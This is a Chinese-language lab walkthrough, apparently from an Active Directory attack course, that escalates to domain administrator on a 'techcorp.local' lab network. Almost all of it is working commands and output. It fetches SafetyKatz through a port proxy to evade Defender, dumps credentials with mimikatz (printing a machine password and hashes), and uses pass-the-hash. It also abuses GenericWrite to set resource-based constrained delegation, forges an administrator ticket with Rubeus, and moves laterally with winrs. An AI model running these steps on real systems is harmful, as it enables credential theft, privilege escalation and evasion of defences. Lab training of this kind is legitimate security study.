Task
•  Find a computer object in US domain where we have Write permissions.
•  Abuse the Write permissions to access that computer as Domain Admin.
•  Extract secrets from that machine for users and hunt for local admin privileges for the users.

# Find a computer object in US domain where we have Write permissions.

在hands-on 5中我们通过把学生账号添加 进MachineAdmins，已经获得了us-mgmt的管理权限

传文件到us-mgmt
```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-mgmt\C$\Users\Public\Loader.exe /Y
```

横向到us-mgmt，转发学生机80端口流量到本地8080，这一步主要是 为了avoid defender
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.138
```

使用Loader.exe加载SafetyKatz
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe	
```

dump出哈希
```
mimikatz # sekurlsa::ekeys

Authentication Id : 0 ; 959288 (00000000:000ea338)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/25/2022 3:38:36 AM
SID               : S-1-5-90-0-2

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 1608280 (00000000:00188a58)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 3:45:55 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1115

         * Username : mgmtadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f
           rc4_hmac_nt       e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_old      e53153fc2dc8d4c5a5839e46220717e5
           rc4_md4           e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_nt_exp   e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_old_exp  e53153fc2dc8d4c5a5839e46220717e5





```

有一个mgmtadmin用户，查看这个用户有无啥特别的ACL

```
PS C:\Users\studentuser138> . C:\AD\Tools\PowerView.ps1
PS C:\Users\studentuser138> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}


ObjectDN                : CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1115
IdentityReferenceName   : mgmtadmin
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=mgmtadmin,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : user
```

对US-HELPDESK这台机器有ListChildren, ReadProperty, GenericWrite的权限


# Abuse the Write permissions to access that computer as Domain Admin.

由于对us-helpdesk这台机器有GenericWrite的权限，我们可以为us-helpdesk设置一个基于资源的约束委派（RBCD，Resource-based Constrained Delegation）

这里我们使用学生机器，而不是学生账号作为资源委派的对象

1. 首先pth获取一个mgmtadmin的shell

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe" "exit"
```

2. 在新起的cmd下使用ActiveDirectory module设置RBCD

```
PS C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

PS C:\Windows\system32> $comps = 'STUDENT138$'

PS C:\Windows\system32> Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose
VERBOSE: Performing the operation "Set" on target "CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local".
PS C:\Windows\system32>
```

3. 导出学生机（student138$）的哈希

```
PS C:\Windows\system32> C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"

[*] Dumping lsass (708) to C:\Windows\Temp\debug.bin
[+] Dump successful!

[*] Executing loaded Mimikatz PE

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 21 2021 15:08:31
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/


mimikatz(commandline) # sekurlsa::ekeys

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : STUDENT138$
Domain            : US
Logon Server      : (null)
Logon Time        : 11/1/2022 7:17:18 AM
SID               : S-1-5-20

         * Username : student138$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b3c877b9ab682cad398571ac5283ea9f4191d7d53b716786f5ba5c0050f9aeb5
           rc4_hmac_nt       9f244890767ab2fa44ddd6c75fd24df3
           rc4_hmac_old      9f244890767ab2fa44ddd6c75fd24df3
           rc4_md4           9f244890767ab2fa44ddd6c75fd24df3
           rc4_hmac_nt_exp   9f244890767ab2fa44ddd6c75fd24df3
           rc4_hmac_old_exp  9f244890767ab2fa44ddd6c75fd24df3
```

4. 使用student138$的哈希，请求一张访问us-helpdesk http服务的tgs

在步骤2的shell里执行
```
C:\AD\Tools\Rubeus.exe s4u /user:STUDENT138$ /aes256:b3c877b9ab682cad398571ac5283ea9f4191d7d53b716786f5ba5c0050f9aeb5 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
```

查看票据已导入当前session
```
PS C:\Windows\system32> klist

Current LogonId is 0:0xf588d0

Cached Tickets: (1)

#0>     Client: administrator @ US.TECHCORP.LOCAL
        Server: http/us-helpdesk @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 11/2/2022 2:29:28 (local)
        End Time:   11/2/2022 12:29:28 (local)
        Renew Time: 11/9/2022 2:29:28 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

5. 现在可以横向到us-helpdesk
```
PS C:\Windows\system32> winrs -r:us-helpdesk cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.US>hostname
hostname
US-HelpDesk

C:\Users\Administrator.US>whoami
whoami
us\administrator
```

# Extract secrets from that machine for users and hunt for local admin privileges for the users.

1. 为了拷贝loader到us-helpdesk，现在申请一张cifs的tgs,就在上面 shell里 操作

```
C:\AD\Tools\Rubeus.exe s4u /user:STUDENT138$ /aes256:b3c877b9ab682cad398571ac5283ea9f4191d7d53b716786f5ba5c0050f9aeb5 /msdsspn:cifs/us-helpdesk /impersonateuser:administrator /ptt
```

2. 拷贝Loader.exe到us-helpdesk

```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-helpdesk\C$\Users\Public\Loader.exe /Y
```

3. 横向到us-helpdesk

```
winrs -r:us-helpdesk cmd
```

4. 操纵流量
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.138
```

5. load mimikatz，并且执行导出哈希

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```

```
mimikatz # sekurlsa::ekeys

Authentication Id : 0 ; 1376548 (00000000:00150124)
Session           : RemoteInteractive from 2
User Name         : helpdeskadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 3:44:18 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1120

         * Username : helpdeskadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534
           rc4_hmac_nt       94b4a7961bb45377f6e7951b0d8630be
           rc4_hmac_old      94b4a7961bb45377f6e7951b0d8630be
           rc4_md4           94b4a7961bb45377f6e7951b0d8630be
           rc4_hmac_nt_exp   94b4a7961bb45377f6e7951b0d8630be
           rc4_hmac_old_exp  94b4a7961bb45377f6e7951b0d8630be



Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : US-HELPDESK$
Domain            : US
Logon Server      : (null)
Logon Time        : 7/25/2022 3:28:02 AM
SID               : S-1-5-18

         * Username : us-helpdesk$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b654a7108a6e384d0e8a57db97dc10afed802f40b419eb7688e821478ccdaf9f
           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
           rc4_hmac_old      76c3848cc2e34ef0a8b5751f7e886b8e
           rc4_md4           76c3848cc2e34ef0a8b5751f7e886b8e
           rc4_hmac_nt_exp   76c3848cc2e34ef0a8b5751f7e886b8e
           rc4_hmac_old_exp  76c3848cc2e34ef0a8b5751f7e886b8e

Authentication Id : 0 ; 1377972 (00000000:001506b4)
Session           : RemoteInteractive from 2
User Name         : helpdeskadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 3:44:18 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1120

         * Username : helpdeskadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534
           rc4_hmac_nt       94b4a7961bb45377f6e7951b0d8630be
           rc4_hmac_old      94b4a7961bb45377f6e7951b0d8630be
           rc4_md4           94b4a7961bb45377f6e7951b0d8630be
           rc4_hmac_nt_exp   94b4a7961bb45377f6e7951b0d8630be
           rc4_hmac_old_exp  94b4a7961bb45377f6e7951b0d8630be


```

有一个新用户的哈希出现：helpdeskadmin

使用这个用户的哈希pth

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:helpdeskadmin /domain:us.techcorp.local /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /run:cmd.exe" "exit"
```

在新的shell下查看helpdeskadmin对哪些机器有admin权限
```
C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Verbose
VERBOSE: Trying to run a command parallely on provided computers list using PSRemoting .
US-HelpDesk
US-ADConnect
```